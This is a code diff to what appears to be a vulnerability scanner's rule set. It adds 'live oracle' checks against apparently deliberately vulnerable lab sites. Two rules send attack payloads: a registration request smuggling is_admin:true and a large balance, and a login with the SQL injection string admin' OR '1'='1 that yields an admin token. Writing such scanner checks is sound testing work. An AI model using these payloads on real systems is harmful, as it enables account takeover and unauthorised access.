@@ -7988,6 +7988,27 @@ const burpbountyRedirectPpLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyDwrUtilLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/dwr/util.js", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const dwrUtilOk =
+    /\/\/\s*DWRUtil\s+JavaScript/i.test(doc.body) &&
+    /dwr\.util\.getValue\s*=\s*function/i.test(doc.body) &&
+    /DWRUtil\s*=\s*dwr\.util/i.test(doc.body);
+  if (!dwrUtilOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /dwr/util.js returns DWRUtil JavaScript with dwr.util.getValue — Direct Web Remoting util profile oracle distinct from /dwr/interface/"
+    }
+  };
+};
+
 const burpbountyGitConfigLiveOracle: Rule = async (ctx) => {
   if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/.git/config", ctx.origin).toString();
@@ -16379,6 +16400,89 @@ const vulnbankAiAnonymousChatLiveOracle: Rule = async (ctx) => {
       model,
       snippet: doc.body.slice(0, 280).trim(),
       note: "Vuln Bank POST /api/ai/chat/anonymous returns mode:anonymous success with LLM response and no-auth warning — unauthenticated AI customer-support oracle"
+    }
+  };
+};
+
+const vulnbankBoplaRegisterLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const probeUser = `thugir_bopla_${Date.now().toString(36)}`;
+  const payload = JSON.stringify({
+    username: probeUser,
+    password: "ThugirProbe1!",
+    is_admin: true,
+    balance: 99999
+  });
+  const doc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const debugData = parsed.debug_data;
+  if (status !== "success" || !debugData || typeof debugData !== "object") return NEGATIVE;
+  const isAdmin = (debugData as { is_admin?: unknown }).is_admin;
+  const fieldsRegistered = (debugData as { fields_registered?: unknown }).fields_registered;
+  if (isAdmin !== true) return NEGATIVE;
+  if (!Array.isArray(fieldsRegistered) || !fieldsRegistered.includes("is_admin")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: registerUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /register accepts hidden is_admin:true in JSON body and echoes debug_data.is_admin:true — BOPLA privilege escalation oracle"
+    }
+  };
+};
+
+const vulnbankSqliLoginLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const payload = JSON.stringify({
+    username: "admin' OR '1'='1",
+    password: "x"
+  });
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const token = String(parsed.token ?? "");
+  const isAdmin = parsed.isAdmin;
+  const debugInfo = parsed.debug_info;
+  if (status !== "success" || !token.startsWith("eyJ")) return NEGATIVE;
+  if (isAdmin !== true) return NEGATIVE;
+  if (!debugInfo || typeof debugInfo !== "object") return NEGATIVE;
+  const username = String((debugInfo as { username?: unknown }).username ?? "");
+  if (username !== "admin") return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /login with admin' OR '1'='1 auth-bypass returns isAdmin:true JWT — SQL injection login oracle"
     }
   };
 };
@@ -34515,6 +34619,8 @@ export const RULES: Record<string, Rule> = {
   vulnExposeAuthBypassApiLiveOracle,
   vulnExposeSqliSearchApiLiveOracle,
   vulnbankAiAnonymousChatLiveOracle,
+  vulnbankBoplaRegisterLiveOracle,
+  vulnbankSqliLoginLiveOracle,
   clientSideDragSecurityFlawsEvidence,
   clientSideDragSecurityFlawsLabModuleEvidence,
   clientSideWizerCtfEvidence,
@@ -34944,6 +35050,7 @@ export const RULES: Record<string, Rule> = {
   burpbountySsrfSchemeLiveOracle,
   burpbountyRedirectOutLiveOracle,
   burpbountyRedirectPpLiveOracle,
+  burpbountyDwrUtilLiveOracle,
   burpbountyGitConfigLiveOracle,
   burpbountyCollabForgotLiveOracle,
   burpbountyRceExpectLiveOracle,
